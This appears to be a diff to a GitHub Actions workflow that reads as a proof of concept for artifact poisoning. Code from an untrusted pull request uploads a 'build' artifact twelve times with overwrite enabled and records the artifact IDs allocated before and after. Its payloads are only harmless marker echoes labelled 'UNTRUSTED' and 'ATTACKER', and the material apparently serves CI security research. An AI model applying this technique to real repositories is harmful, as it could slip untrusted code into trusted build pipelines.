@@ -1,19 +1,100 @@
 name: CI
-on:
-  pull_request:
+on: pull_request
 jobs:
-  evil:
+  build:
     runs-on: ubuntu-latest
+    env:
+      GH_TOKEN: ${{ github.token }}
     steps:
       - run: |
           mkdir -p dist
-          echo "ATTACKER-BUILD run=${GITHUB_RUN_ID} repo=${GITHUB_REPOSITORY}" > dist/build.txt
-          echo "ATTACKER-SIDECAR run=${GITHUB_RUN_ID}" > dist/sidecar.txt
+          echo "UNTRUSTED-BUILD lane=1 run=${GITHUB_RUN_ID} t=$(date -u +%H:%M:%S)" > dist/marker.txt
+          printf 'echo UNTRUSTED-CODE-RAN lane=1 run=%s\n' "$GITHUB_RUN_ID" > dist/build.sh
+          gh api '/repos/${GITHUB_REPOSITORY}/actions/artifacts?per_page=1' --jq '.artifacts[0].id' | sed 's/^/TOP_BEFORE=/'
       - uses: actions/upload-artifact@v4
+        id: u1
         with:
           name: build
-          path: dist/build.txt
+          path: dist
+          overwrite: true
       - uses: actions/upload-artifact@v4
+        id: u2
         with:
-          name: sidecar
-          path: dist/sidecar.txt
+          name: build
+          path: dist
+          overwrite: true
+      - uses: actions/upload-artifact@v4
+        id: u3
+        with:
+          name: build
+          path: dist
+          overwrite: true
+      - uses: actions/upload-artifact@v4
+        id: u4
+        with:
+          name: build
+          path: dist
+          overwrite: true
+      - uses: actions/upload-artifact@v4
+        id: u5
+        with:
+          name: build
+          path: dist
+          overwrite: true
+      - uses: actions/upload-artifact@v4
+        id: u6
+        with:
+          name: build
+          path: dist
+          overwrite: true
+      - uses: actions/upload-artifact@v4
+        id: u7
+        with:
+          name: build
+          path: dist
+          overwrite: true
+      - uses: actions/upload-artifact@v4
+        id: u8
+        with:
+          name: build
+          path: dist
+          overwrite: true
+      - uses: actions/upload-artifact@v4
+        id: u9
+        with:
+          name: build
+          path: dist
+          overwrite: true
+      - uses: actions/upload-artifact@v4
+        id: u10
+        with:
+          name: build
+          path: dist
+          overwrite: true
+      - uses: actions/upload-artifact@v4
+        id: u11
+        with:
+          name: build
+          path: dist
+          overwrite: true
+      - uses: actions/upload-artifact@v4
+        id: u12
+        with:
+          name: build
+          path: dist
+          overwrite: true
+      - name: report the ids this run allocated
+        run: |
+          echo "draw1=${{ steps.u1.outputs.artifact-id }}"
+          echo "draw2=${{ steps.u2.outputs.artifact-id }}"
+          echo "draw3=${{ steps.u3.outputs.artifact-id }}"
+          echo "draw4=${{ steps.u4.outputs.artifact-id }}"
+          echo "draw5=${{ steps.u5.outputs.artifact-id }}"
+          echo "draw6=${{ steps.u6.outputs.artifact-id }}"
+          echo "draw7=${{ steps.u7.outputs.artifact-id }}"
+          echo "draw8=${{ steps.u8.outputs.artifact-id }}"
+          echo "draw9=${{ steps.u9.outputs.artifact-id }}"
+          echo "draw10=${{ steps.u10.outputs.artifact-id }}"
+          echo "draw11=${{ steps.u11.outputs.artifact-id }}"
+          echo "draw12=${{ steps.u12.outputs.artifact-id }}"
+          gh api '/repos/${GITHUB_REPOSITORY}/actions/artifacts?per_page=1' --jq '.artifacts[0].id' | sed 's/^/TOP_AFTER=/'
